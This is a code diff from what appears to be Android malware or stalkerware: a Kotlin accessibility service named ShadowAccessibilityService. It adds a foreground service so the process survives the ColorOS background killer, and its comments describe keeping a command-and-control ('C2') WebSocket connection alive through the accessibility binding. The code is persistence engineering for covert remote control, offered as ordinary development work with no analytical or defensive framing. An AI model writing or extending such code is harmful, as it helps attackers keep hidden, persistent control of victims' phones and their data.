@@ -57,6 +57,16 @@ class ShadowAccessibilityService : AccessibilityService() {
             Log.e("ShadowA11y", "Failed to enqueue worker", e)
         }
 
+        // Promote the process to a foreground service so the ColorOS reaper backs
+        // off from the ~48s kill it applies to plain background processes. This is
+        // the survival path — a11y is the low-latency path, the FG service is the
+        // keep-alive path.
+        try {
+            com.shadow.SyncForegroundService.start(applicationContext)
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "Failed to start foreground service", e)
+        }
+
         // Start C2 immediately — don't wait for the 15-minute PeriodicWork window.
         // The a11y binding keeps the process alive, so the WSS stays up as long as
         // Android holds the service.
